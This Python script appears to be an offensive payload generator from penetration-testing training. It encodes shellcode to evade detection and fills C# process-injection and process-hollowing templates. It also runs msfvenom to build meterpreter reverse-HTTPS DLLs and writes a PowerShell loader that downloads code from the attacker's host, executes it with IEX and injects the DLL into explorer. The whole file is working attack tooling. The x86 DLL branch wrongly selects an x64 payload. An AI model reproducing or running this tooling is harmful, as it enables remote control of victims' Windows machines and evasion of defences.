 #!/bin/python3
import subprocess
import socket
import random
from colorama import init
from termcolor import colored
 
init()

def read_file(f):
        with open(f, 'r') as fs:
            content = fs.read()
        return content

def shellcodeEncoder(shellcode):
    # Python shellcode encoder 
    shellcode = "".join(shellcode.splitlines())
    #print(shellcode)
    start = shellcode.find("{")
    end = shellcode.find("}")
    shellcode_start = shellcode[0:start].strip()
    shellcode = shellcode[start+1:end].strip()
    shellcode_chars = shellcode.split(",") 
    shellcode_chars = list(filter(None, shellcode_chars))

    encoded_shellcode_chars = []
    for c in shellcode_chars:
        encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)+2 & 0xFF))
    
    return (shellcode_start + " {"+ ",".join(encoded_shellcode_chars) + "};")

def generateProcessInjection(shellcode, arch):
    print("[+] Process Injection")
 
    print(colored(f"    [+] Generating C# Process Injection exploit", 'green'))


    # Python shellcode encoder  
    encoded_shellcode = shellcodeEncoder(shellcode)


    # C# shellcode runner
    template_name = "cs_process_injection.cs"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode )
    
    f = open(f"output/process_migration/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()

def generateProcessHollowing(shellcode, arch):
    print("[+] Process hollowing")
 
    print(colored(f"    [+] Generating C# Process Hollowing exploit", 'green'))


    # Python shellcode encoder  
    encoded_shellcode = shellcodeEncoder(shellcode)


    # C# shellcode runner
    template_name = "cs_process_hollowing.cs"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode )
    
    f = open(f"output/process_migration/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()

def dllInection(lhost, lport, arch):
    print("[+] DLL injection")
    print(colored(f"    [+] msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f dll -o /var/www/html/met.dll", 'green'))
    # create DLL
    # sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll`
    if (arch == "x64"):
        mpayload = "windows/x64/meterpreter/reverse_https"
    elif (arch == "x86"):
        mpayload = "windows/x64/meterpreter/reverse_https"

    subprocess.run(["msfvenom", "-p", mpayload, "LHOST="+lhost, "LPORT="+str(lport), "EXITFUNC=thread", "-f", "dll", "-o", f"/var/www/html/met-{arch}.dll" ], capture_output=True, text=True)


    payload = f"http://{lhost}/met-{arch}.dll"
    template_name = "cs_dll_injection.cs"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%PAYLOAD%", payload)
    
    f = open(f"output/process_migration/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()




def reflectiveDllInjection(lhost, lport, arch):
    print("[+] Reflective DLL injection with PowerShell")
     # script must be from offsec - adjusted one

    payload = f"""
$bytes = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/met-{arch}.dll') 
$procid = (Get-Process -Name explorer).Id

(New-Object System.Net.WebClient).DownloadString('http://{lhost}/Invoke-ReflectivePEInjection.ps1') | IEX

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
"""


    # create DLL
    # sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll`
    if (arch == "x64"):
        mpayload = "windows/x64/meterpreter/reverse_https"
    elif (arch == "x86"):
        mpayload = "windows/meterpreter/reverse_https"

    print(colored(f"    [+] msfvenom -p {mpayload} LHOST={lhost} LPORT={lport} -f dll -o /var/www/html/met-{arch}.dll", 'green'))

    subprocess.run(["msfvenom", "-p", mpayload, "LHOST="+lhost, "LPORT="+str(lport), "EXITFUNC=thread", "-f", "dll", "-o", f"/var/www/html/met-{arch}.dll" ], capture_output=True, text=True)

    
    f = open(f"output/process_migration/{arch}/reflective_dll_import.ps1", 'w')
    f.write(payload)
    f.close()